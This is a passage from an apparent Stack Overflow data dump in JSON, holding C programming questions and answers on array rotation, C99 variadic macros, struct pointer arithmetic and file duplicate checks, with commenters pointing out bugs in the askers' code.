fscanf(filepointer,\"%s;%d/%d/%d;%d;%d\\n\",x,&amp;y,&amp;z,&amp;w,&amp;duplicateContactNum,&amp;d);\n                    if(strcmp(contactNumber,duplicateContactNum)==0)\n                    {\n                        checkSentinel++;\n                        break;\n                    }\n\n                }\n                if(checkSentinel!=0)\n                {\n                    rewind(filepointer);\n                    printf(\"You have entered a duplicated entry\\n\");\n                    fclose(filepointer);\n                }\n                else\n                {\n                    rewind(filepointer);\n                    fclose(filepointer);\n                    filepointer=fopen(\"user.txt\",\"a\");\n                    fprintf(filepointer,\"%s;%d/%d/%d;%d;%d\\n\",name,day,month,year,contactNumber,postcode);\n                    fclose(filepointer);\n                }\n</code></pre>\n"}, {"tags": ["c", "arrays", "rotation"], "comments": [{"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 5, "creation_date": 1499242610, "post_id": 44920531, "comment_id": 76816952, "body": "Can you insert your comments as comments in the code? Your text in between the code is not good if we want to copy/paste the code. Also comments like <code>Here i have addded standered library.</code> are not necessary, we can see the includes."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1499243349, "post_id": 44920531, "comment_id": 76817429, "body": "<code>for(i = 0; i &lt; n; i++) { arrb[j] = arr[i]; j++; }</code> no need for two variables, you can simply <code>arrb[i] = arr[i];</code>, however, if <code>n</code> is greater than 5, you access  <code>arr</code> out of its bounds -&gt; undefined behaviour!"}, {"owner": {"reputation": 573, "user_id": 1400579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1365cb7f230059b3aa32d3eab2abdd0?s=128&d=identicon&r=PG", "display_name": "DaveP", "link": "https://stackoverflow.com/users/1400579/davep"}, "edited": false, "score": 0, "creation_date": 1499244805, "post_id": 44920531, "comment_id": 76818428, "body": "Would this not be a better fit for <a href=\"https://codereview.stackexchange.com\">Code Review</a>?"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1499246774, "post_id": 44920531, "comment_id": 76819937, "body": "Could you please show me an Input and a desired Output?  If the array contains 1,2,3,4,5 and the user says 3, do you need to rotate that array to look like this: 3,4,5,1,2 ?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499302847, "post_id": 44920531, "comment_id": 76852691, "body": "the posted code prompts the user to enter a 5 element array, but fails to actually enter that array at that time, but rather prompts the user for the amount the array is to be shifted.  Then, later, inputs the 5 element array values."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 7819220, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81fc4a7a71843c1ca9be25db23113cb6?s=128&d=identicon&r=PG&f=1", "display_name": "M. AR.", "link": "https://stackoverflow.com/users/7819220/m-ar"}, "is_accepted": false, "score": 0, "last_activity_date": 1499245112, "last_edit_date": 1499245112, "creation_date": 1499244708, "answer_id": 44921366, "question_id": 44920531, "link": "https://stackoverflow.com/questions/44920531/is-it-the-efficeint-program-to-rotate-array-in-left-direction/44921366#44921366", "title": "Is it the efficeint program to rotate array in left direction?", "body": "<p>I think you want to do something like this (you should check that 0 &lt;= n &lt;= 5, too):</p>\n\n<pre><code>int b[5];\nint k = 0;\nfor(i=0; i&lt;5; i++){\n\n    if (i &lt; 5 - n)\n        b[i] = arr[i+n];\n    else\n    {\n        b[i] = arr[k];\n        k++;\n    }\n}\n</code></pre>\n\n<p>Array b is used to save the rotated matrix.</p>\n"}, {"tags": [], "owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "is_accepted": false, "score": 3, "last_activity_date": 1499245639, "last_edit_date": 1499245639, "creation_date": 1499244814, "answer_id": 44921396, "question_id": 44920531, "link": "https://stackoverflow.com/questions/44920531/is-it-the-efficeint-program-to-rotate-array-in-left-direction/44921396#44921396", "title": "Is it the efficeint program to rotate array in left direction?", "body": "<blockquote>\n  <p>Is it the efficeint program to rotate array in left direction?</p>\n</blockquote>\n\n<p>Actually, very complicated, and some problems contained:</p>\n\n<pre><code>for(i = 0; i &lt; n; i++)\n{\n    arrb[j] = arr[i];\n    j++;\n}\n</code></pre>\n\n<p>Why not simply:</p>\n\n<pre><code>for(i = 0; i &lt; n; i++)\n{\n     arrb[i] = arr[i];\n}\n</code></pre>\n\n<p>There is no need for a second variable. Still, if <code>n</code> is greater than five, you get into trouble, as you will access <code>arr</code> out of its bounts (undefined behaviour!). At least, you should check the user input!</p>\n\n<pre><code>for(i = 0; i &lt;=3 ; i++)\n{\n    arr[i] = arr[i + n];\n}\n</code></pre>\n\n<p>Same problem: last accessible index is 4 (four), so n must not exceed 1, or you again access the array out of bounds...</p>\n\n<p>Those many 'if's within the printing loop for the first array <em>cannot</em> be efficient...</p>\n\n<p>You can have it much, much simpler:</p>\n\n<pre><code>int arr[5], arrb[5];\n//               ^\n\nfor(int i = 0; i &lt; 5; ++i)\n    arrb[i] = arr[(i + n) % 5];\n</code></pre>\n\n<p>This does not cover <em>negative</em> values of n, though.</p>\n\n<pre><code>    arrb[i] = arr[(((i + n) % 5) + 5) % 5];\n</code></pre>\n\n<p>would be safe even for negative values... All you need now for the output is:</p>\n\n<pre><code>for(int i = 0; i &lt; 5; ++i)\n    printf(\"%d \", arrb[i]);\n</code></pre>\n\n<p>There would be one last point uncovered, though: if user enters for <code>n</code> a value greater than <code>INT_MAX - 4</code>, you get a signed integer overflow, which again is undefined behaviour!</p>\n\n<p>We can again cover this by changing the index formula:</p>\n\n<pre><code>arrb[i] = arr[(5 + i + (n % 5)) % 5];\n</code></pre>\n\n<p><code>n % 5</code> is invariant, so we can move it out of the loop:</p>\n\n<pre><code>n %= 5;\nfor(int i = 0; i &lt; 5; ++i)\n    arrb[i] = arr[(5 + i + n) % 5];\n</code></pre>\n\n<p>Finally, if we make <code>n</code> positive already outside, we can spare the addition in the for loop. </p>\n\n<pre><code>n = ((n % 5) + 5) % 5;\nfor(int i = 0; i &lt; 5; ++i)\n    arrb[i] = arr[(i + n) % 5]; // my original formula again...\n</code></pre>\n\n<p>Last step is especially worth considering for very long running loops.</p>\n"}], "owner": {"reputation": 23, "user_id": 7804131, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yfNUs.jpg?s=128&g=1", "display_name": "Harsh", "link": "https://stackoverflow.com/users/7804131/harsh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1499245639, "creation_date": 1499242369, "last_edit_date": 1499245317, "question_id": 44920531, "link": "https://stackoverflow.com/questions/44920531/is-it-the-efficeint-program-to-rotate-array-in-left-direction", "title": "Is it the efficeint program to rotate array in left direction?", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nmain()\n{\n    int i,j,l,m,n;\n    j=0;\n    printf(\"\\nenter 5 element single dimension array\\n\");\n    printf(\"enter shift rate\\n\");\n    scanf(\"%d\",&amp;n);\n\n    /* Here we take input from user that by what times user wants to rotate the array in left. */\n\n    int arr[5],arrb[n];\n    for(i=0;i&lt;=4;i++){\n        scanf(\"%d\",&amp;arr[i]);\n    }\n\n    /* Here we have taken another array. */\n\n    for(i=0;i&lt;=4;i++){\n        printf(\"%d\",arr[i]);\n    }\n    for(i=0;i&lt;n;i++){\n        arrb[j]=arr[i];\n        j++;\n        // These loop will shift array element to left by position which's entered by user.\n    }\n    printf(\"\\n\");\n\n    for(i=0;i&lt;=3;i++){\n        arr[i]=arr[i+n];\n    }\n    for(i=0;i&lt;=4;i++){\n        if(n==1 &amp;&amp; i==4)\n            break;\n        if(n==2 &amp;&amp; i==3)\n            break;\n        if(n==3 &amp;&amp; i==2)\n            break;\n        printf(\"%d\",arr[i]);\n    }\n\n    //To combine these two arrays. Make it look like  single array instead of two\n    for(i=0;i&lt;n;i++){\n        printf(\"%d\",arrb[i]);\n    }\n    // Final sorted array will get printed here\n}\n</code></pre>\n"}, {"tags": ["c", "c-preprocessor", "c99", "variadic-macros"], "answers": [{"tags": [], "owner": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "is_accepted": false, "score": 2, "last_activity_date": 1499268774, "last_edit_date": 1499268774, "creation_date": 1499264696, "answer_id": 44928959, "question_id": 44920515, "link": "https://stackoverflow.com/questions/44920515/c99-compatible-nested-calls-within-variadic-macros/44928959#44928959", "title": "C99 compatible nested calls within variadic macros", "body": "<p>This approach is slightly more concise (10 macros vs 12), and at least to my eyes a bit more organized (more of the macros are general purpose):</p>\n\n<pre><code>#define GLUE(A,B) GLUE_I(A,B)\n#define GLUE_I(A,B) A##B\n#define FIRSTOFMANY(X,...) X\n// This can be used as a pattern matcher on the first argument.\n// Generally, the first argument is ignored; but if it's\n// an object-like macro whose expansion has a comma, it can\n// shift a new second argument in that's returned.\n// Thus, you can build a \"query pattern\" as the first argument,\n// pass a \"default\" as the second, and override the default with\n// \"matched pattern macros\".\n#define SECOND(...) SECOND_I(__VA_ARGS__,,)\n#define SECOND_I(_,X,...) X\n// Expands to a count of arguments (min 1, max 15).\n#define COUNT(...) COUNT_I(__VA_ARGS__,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1,)\n#define COUNT_I(_,_15,_14,_13,_12,_11,_10,_9,_8,_7,_6,_5,_4,_3,_2,X,...) X\n\n#define send(obj, ...) \\\n    find_method(obj, FIRSTOFMANY(__VA_ARGS__,)) \\\n    ( \\\n      /* select a macro based on ... count (default SEND_LONG) */ \\\n      SECOND(GLUE(WHEN_SEND_VCNT_EQ_,COUNT(__VA_ARGS__)),SEND_LONG)\\\n      (obj, __VA_ARGS__) \\\n    )\n#define SEND_LONG(X,Y,...) X,__VA_ARGS__\n// Use FIRSTOFMANY when send's varying arg count is 1\n#define WHEN_SEND_VCNT_EQ_1 , FIRSTOFMANY\n</code></pre>\n\n<p>...it's also C99 compliant (not relying on gnu extensions).</p>\n"}, {"tags": [], "owner": {"reputation": 161, "user_id": 8244545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d293cf43a79eee14a0a5dce200d6bf81?s=128&d=identicon&r=PG&f=1", "display_name": "Viktor Shepel", "link": "https://stackoverflow.com/users/8244545/viktor-shepel"}, "is_accepted": true, "score": 1, "last_activity_date": 1499312680, "creation_date": 1499312680, "answer_id": 44939448, "question_id": 44920515, "link": "https://stackoverflow.com/questions/44920515/c99-compatible-nested-calls-within-variadic-macros/44939448#44939448", "title": "C99 compatible nested calls within variadic macros", "body": "<p>macros <a href=\"https://stackoverflow.com/questions/20818800/variadic-macro-and-trailing-comma\">overloading</a> technique provides shortest code so far.</p>\n\n<pre><code>#define SEND_NO_ARG(obj, msg) find_method(obj, msg)(obj)\n#define SEND_ARG(obj, msg, ...) find_method(obj, msg)(obj, __VA_ARGS__)\n\n#define GET_18TH_ARG(arg1, arg2, arg3, arg4, arg5,        \\\n    arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13,   \\\n    arg14, arg15, arg16, arg17, arg18, ...) arg18\n#define SEND_MACRO_SELECTOR(...)                          \\\n    GET_18TH_ARG(__VA_ARGS__,                             \\\n        SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, \\\n        SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, \\\n        SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, \\\n        SEND_NO_ARG, )\n\n#define send(...) SEND_MACRO_SELECTOR(__VA_ARGS__)(__VA_ARGS__)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "is_accepted": false, "score": 0, "last_activity_date": 1499494409, "creation_date": 1499494409, "answer_id": 44983144, "question_id": 44920515, "link": "https://stackoverflow.com/questions/44920515/c99-compatible-nested-calls-within-variadic-macros/44983144#44983144", "title": "C99 compatible nested calls within variadic macros", "body": "<blockquote>GNU gcc extension for ## operator prevents nested calls from being expanded, see code below.</blockquote>\n\n<p>If you're willing to use the gnu extension, here's an even more concise approach:</p>\n\n<pre><code>#define COMMAVA(...) ,##__VA_ARGS__\n#define send(obj, msg, ...) find_method(obj, msg)(obj COMMAVA(__VA_ARGS__))\n</code></pre>\n"}], "owner": {"reputation": 161, "user_id": 8244545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d293cf43a79eee14a0a5dce200d6bf81?s=128&d=identicon&r=PG&f=1", "display_name": "Viktor Shepel", "link": "https://stackoverflow.com/users/8244545/viktor-shepel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 804, "favorite_count": 1, "accepted_answer_id": 44939448, "answer_count": 3, "score": 4, "last_activity_date": 1499494409, "creation_date": 1499242309, "last_edit_date": 1499306721, "question_id": 44920515, "link": "https://stackoverflow.com/questions/44920515/c99-compatible-nested-calls-within-variadic-macros", "title": "C99 compatible nested calls within variadic macros", "body": "<p>Need a way to support nested calls in variadic macros with optional argument. <sub>same as <a href=\"https://stackoverflow.com/questions/27514116/variadic-macros-expansion-of-pasted-tokens\">this</a> but C99 compatible</sub></p>\n\n<p>GNU gcc extension for <code>##</code> operator prevents nested calls from being expanded, see code below.</p>\n\n<pre><code>#define send(obj, msg, ...) find_method(obj, msg)(obj, ##__VA_ARGS__)\n\n/* Ok */\nsend(0, \"+\", 1);\nfind_method(0, \"+\")(0, 1);\n\n/* Ok. nested call as macros named argument */\nsend(send(5, \"increment\"), \"+\", 1);\nfind_method(find_method(5, \"increment\")(5), \"+\")(find_method(5, \"increment\")(5), 1);\n\n/* Fail. nested call as macros variable argument i.e. `send` macro is not expanded */\nsend(0, \"+\", send(5, \"increment\"));\nfind_method(0, \"+\")(0, send(5, \"increment\"));\n\n/*\n * preprocess with next commands\n *\n * gcc-4.9   -Wall -std=c99 -E -c file.c | less\n * clang-3.8 -Wall -std=c99 -E -c file.c | less\n */\n</code></pre>\n\n<p>I've modified Jens Gustedt <a href=\"https://gustedt.wordpress.com/2010/06/08/detect-empty-macro-arguments/\" rel=\"nofollow noreferrer\">solution</a> to place optional comma, see code below.</p>\n\n<p><strong>Are there more concise alternatives ?</strong></p>\n\n<pre><code>#define _ARG16(              \\\n    _0,  _1,  _2,  _3,  _4,  \\\n    _5,  _6,  _7,  _8,  _9,  \\\n    _10, _11, _12, _13, _14, \\\n    _15, ...) _15\n#define HAS_COMMA(...) \\\n    _ARG16(__VA_ARGS__, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0)\n#define _TRIGGER_PARENTHESIS_(...) ,\n\n#define OPTIONAL_COMMA(...)                                             \\\n    _ISEMPTY(                                                           \\\n          /* test if there is just one argument, eventually an empty    \\\n             one */                                                     \\\n          HAS_COMMA(__VA_ARGS__),                                       \\\n          /* test if _TRIGGER_PARENTHESIS_ together with the argument   \\\n             adds a comma */                                            \\\n          HAS_COMMA(_TRIGGER_PARENTHESIS_ __VA_ARGS__),                 \\\n          /* test if the argument together with a parenthesis           \\\n             adds a comma */                                            \\\n          HAS_COMMA(__VA_ARGS__ (/*empty*/)),                           \\\n          /* test if placing it between _TRIGGER_PARENTHESIS_ and the   \\\n             parenthesis adds a comma */                                \\\n          HAS_COMMA(_TRIGGER_PARENTHESIS_ __VA_ARGS__ (/*empty*/))      \\\n    )\n\n#define SPACE_SYMBOL\n#define COMMA_SYMBOL ,\n#define ARG3(_0, _1, _2, ...) _2\n#define OPTIONAL_COMMA_FROM(...) ARG3(__VA_ARGS__, SPACE_SYMBOL, COMMA_SYMBOL)\n\n#define PASTE5(_0, _1, _2, _3, _4) _0 ## _1 ## _2 ## _3 ## _4\n#define _ISEMPTY(_0, _1, _2, _3) \\\n    OPTIONAL_COMMA_FROM(PASTE5(_IS_EMPTY_CASE_, _0, _1, _2, _3))\n#define _IS_EMPTY_CASE_0001 ,\n\n#define send(obj, msg, ...) \\\n    find_method(obj, msg)(obj OPTIONAL_COMMA(__VA_ARGS__) __VA_ARGS__)\n\n/* Ok */\nsend(0, \"+\", 1);\n\n/* Ok */\nsend(send(5, \"increment\"), \"+\", 1);\n\n/* Ok */\nsend(0, \"+\", send(5, \"increment\"));\n</code></pre>\n\n<p><strong>Update:</strong></p>\n\n<p>H Walters thanks for idea.</p>\n\n<p>Didn't noticed approach with macros <a href=\"https://stackoverflow.com/q/20818800/8244545\">overloading</a> in first place</p>\n\n<pre><code>#define SEND_NO_ARG(obj, msg) find_method(obj, msg)(obj)\n#define SEND_ARG(obj, msg, ...) find_method(obj, msg)(obj, __VA_ARGS__)\n\n#define GET_18TH_ARG(arg1, arg2, arg3, arg4, arg5,        \\\n    arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13,   \\\n    arg14, arg15, arg16, arg17, arg18, ...) arg18\n#define SEND_MACRO_SELECTOR(...)                          \\\n    GET_18TH_ARG(__VA_ARGS__,                             \\\n        SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, \\\n        SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, \\\n        SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, SEND_ARG, \\\n        SEND_NO_ARG, )\n\n#define send(...) SEND_MACRO_SELECTOR(__VA_ARGS__)(__VA_ARGS__)\n</code></pre>\n"}, {"tags": ["c", "lvalue", "pointer-arithmetic"], "comments": [{"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1499242213, "post_id": 44919956, "comment_id": 76816706, "body": "Not sure what you try to achieve by that - but this is very likely to result in unaligned memory access..."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1499286013, "post_id": 44919956, "comment_id": 76846777, "body": "You already have a character pointer <code>gna</code>, why not just use that as intended? Incrementing a structure pointer by one byte is meaningless."}], "answers": [{"comments": [{"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 1, "creation_date": 1499244272, "post_id": 44920204, "comment_id": 76818051, "body": "You <i>must</i> even see a diagnostic, assigning such a pointer is a constraint violation. But casting that pointer (in this special case) should do. With such a cast your solution is  fine, and <i>the</i> way to go to inspect every byte of the structure."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1499248701, "post_id": 44920204, "comment_id": 76821425, "body": "<code>unsigned char *b = &amp;a;</code> is indeed not valid C. Change this to <code>unsigned char *b = (unsigned char*)&amp;a;</code>."}], "tags": [], "owner": {"reputation": 15105, "user_id": 3768871, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/Wxgi0.jpg?s=128&g=1", "display_name": "OmG", "link": "https://stackoverflow.com/users/3768871/omg"}, "is_accepted": false, "score": 1, "last_activity_date": 1499249538, "last_edit_date": 1499249538, "creation_date": 1499241365, "answer_id": 44920204, "question_id": 44919956, "link": "https://stackoverflow.com/questions/44919956/is-there-a-nice-way-to-advance-a-pointer-to-a-struct-by-one-byte/44920204#44920204", "title": "Is there a &quot;nice&quot; way to advance a pointer to a struct by one byte?", "body": "<p>As solution can be defining a <code>char*</code> pointer to point to the struct. Then by adding this pointer you could access to the bytes of the pointed structure.</p>\n\n<pre><code> s_t a;\n unsigned char *b = (unsigned char*)&amp;a;\n unsigned char next_byte = *(++b);\n</code></pre>\n\n<p>Then by adding <code>b</code> you can get the bytes of the <code>a</code>. The <strong>shortage</strong> of this solution is you might get error or warning in some compilers to pass the pointer to struct by a char pointer.</p>\n"}, {"tags": [], "owner": {"reputation": 11698, "user_id": 1560850, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/dba9e19ac64c87c548a4c636bf5cb7f0?s=128&d=identicon&r=PG", "display_name": "valdo", "link": "https://stackoverflow.com/users/1560850/valdo"}, "is_accepted": false, "score": -2, "last_activity_date": 1499241685, "creation_date": 1499241685, "answer_id": 44920306, "question_id": 44919956, "link": "https://stackoverflow.com/questions/44919956/is-there-a-nice-way-to-advance-a-pointer-to-a-struct-by-one-byte/44920306#44920306", "title": "Is there a &quot;nice&quot; way to advance a pointer to a struct by one byte?", "body": "<p>Obviously type casting such as <code>(uint8_t*)</code> doesn't result in an lvalue. Since your code is in C++, you may use this casting <code>(uint8_t*&amp;)</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1499248633, "post_id": 44920396, "comment_id": 76821370, "body": "I believe this will cause a strict aliasing violation since the compiler cannot know the effective type of the data stored at <code>1 + (uint8_t*) ps</code>. If it therefore assumes that the data is of <code>uint8_t</code> type, you get a strict aliasing violation when you try to access this as a struct."}], "tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": false, "score": 0, "last_activity_date": 1499241963, "creation_date": 1499241963, "answer_id": 44920396, "question_id": 44919956, "link": "https://stackoverflow.com/questions/44919956/is-there-a-nice-way-to-advance-a-pointer-to-a-struct-by-one-byte/44920396#44920396", "title": "Is there a &quot;nice&quot; way to advance a pointer to a struct by one byte?", "body": "<p>How about:</p>\n\n<pre><code>ps = (s_t*) (1 + (uint8_t*) ps);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 261, "user_id": 822728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/193974da54d53d3d9f8a010e0d1be4bf?s=128&d=identicon&r=PG", "display_name": "Markus", "link": "https://stackoverflow.com/users/822728/markus"}, "edited": false, "score": 0, "creation_date": 1499245134, "post_id": 44920625, "comment_id": 76818644, "body": "It makes sense, but since it&#39;s not part of the problem, I didn&#39;t bother to elaborate. Thanks for the hint &quot;uintptr_t&quot; - I used it too rarely to remember..."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 261, "user_id": 822728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/193974da54d53d3d9f8a010e0d1be4bf?s=128&d=identicon&r=PG", "display_name": "Markus", "link": "https://stackoverflow.com/users/822728/markus"}, "edited": false, "score": 0, "creation_date": 1499248514, "post_id": 44920625, "comment_id": 76821270, "body": "@Markus The advantage of <code>uintptr_t</code> over <code>uint8_t</code> is that you won&#39;t get any unexpected pointer aliasing problems. If you convert a struct pointer to <code>uint8_t</code> pointer that&#39;s fine, but when you change that pointer the compiler no longer knows the &quot;effective type&quot; (variable type) of the data stored at that location. It will assume that the data is <code>uint8_t</code>. And then when you convert back to <code>s_t*</code> you get a strict pointer aliasing violation. If you won&#39;t cast back to <code>s_t*</code> then this doesn&#39;t matter."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 5, "last_activity_date": 1499242651, "creation_date": 1499242651, "answer_id": 44920625, "question_id": 44919956, "link": "https://stackoverflow.com/questions/44919956/is-there-a-nice-way-to-advance-a-pointer-to-a-struct-by-one-byte/44920625#44920625", "title": "Is there a &quot;nice&quot; way to advance a pointer to a struct by one byte?", "body": "<p>This doesn't make much sense. If you were to increase the struct pointer by 1 byte, you would end up with a misaligned address, which would be problematic on most systems. I'll have to assume that your system is <em>not</em> any of the mainstream 32/64 bit CPUs (not x86, ARM, PowerPC etc) or otherwise your question makes no sense.</p>\n\n<p>To increase the address by one byte, simply do this:</p>\n\n<pre><code>ps = (s_t*) ((uintptr_t)ps + 1);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1499300541, "creation_date": 1499300541, "answer_id": 44937935, "question_id": 44919956, "link": "https://stackoverflow.com/questions/44919956/is-there-a-nice-way-to-advance-a-pointer-to-a-struct-by-one-byte/44937935#44937935", "title": "Is there a &quot;nice&quot; way to advance a pointer to a struct by one byte?", "body": "<p>regarding the posted code:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n\n// for flexability, do not overlap the 'typedef' with the struct definition \n// (and always use a struct tag name)\ntypedef struct {\n    uint32_t a;\n    uint32_t b;\n} s_t;\n\nint main( int argc, char** argv ) &lt;-- causes 2 compiler warning messages \n// due to unused parameters\n// suggest: int main( void )\n{\n    uint32_t address = 17;\n    s_t* ps = (s_t*) address;  &lt;-- 17 is not a valid address for a struct.\n\n    // ugly   &lt;-- however, it actually works\n    uint8_t* gna = (uint8_t*) ps;\n    ++gna;\n    ps = (s_t*) gna; &lt;-- don't do this, \n    // use 'gna' to access the individual bytes\n\n    // nice\n    ++((uint8_t*) ps); &lt;-- does not compile\n}\n</code></pre>\n"}], "owner": {"reputation": 261, "user_id": 822728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/193974da54d53d3d9f8a010e0d1be4bf?s=128&d=identicon&r=PG", "display_name": "Markus", "link": "https://stackoverflow.com/users/822728/markus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 906, "favorite_count": 0, "accepted_answer_id": 44920625, "answer_count": 5, "score": 1, "last_activity_date": 1499300541, "creation_date": 1499240621, "last_edit_date": 1499241358, "question_id": 44919956, "link": "https://stackoverflow.com/questions/44919956/is-there-a-nice-way-to-advance-a-pointer-to-a-struct-by-one-byte", "title": "Is there a &quot;nice&quot; way to advance a pointer to a struct by one byte?", "body": "<p>I have a pointer to a structure that I would like to move over an\naddress range, byte-by-byte. I have an approach that's working, but\nit's ugly in my eyes. Unfortunately, the \"nice\" way doesn't work. Here's a minimum example:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n\ntypedef struct {\n    uint32_t a;\n    uint32_t b;\n} s_t;\n\nint main( int argc, char** argv )\n{\n    uint32_t address = 17;\n    s_t* ps = (s_t*) address;\n\n    // ugly\n    uint8_t* gna = (uint8_t*) ps;\n    ++gna;\n    ps = (s_t*) gna;\n\n    // nice\n    ++((uint8_t*) ps);\n}\n</code></pre>\n\n<p>The compiler reports an error on the \"nice\" part:</p>\n\n<pre><code>% gcc test.c -o test.bin\ntest.c: In function 'main':\ntest.c:17:5: error: lvalue required as increment operand\n     ++((uint8_t*) ps);\n     ^\n</code></pre>\n\n<p>I understand the error, but I thought casting to an uint8_t* would\ncreate an lvalue. Obviously, I'm wrong.</p>\n\n<p>Is there a way to make it better?</p>\n"}, {"tags": ["c", "cgi"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1499239528, "post_id": 44919221, "comment_id": 76814873, "body": "Show the <i>raw</i> response of your webserver (e.g. obtained with <code>curl -i --raw &lt;url&gt;</code>) please -- I suppose it might not use <i>chunked</i> transfer encoding automagically..."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1499239916, "post_id": 44919221, "comment_id": 76815135, "body": "Enough for an answer I guess. There&#39;s not even a <code>Content-Length</code> header..."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1499240022, "post_id": 44919221, 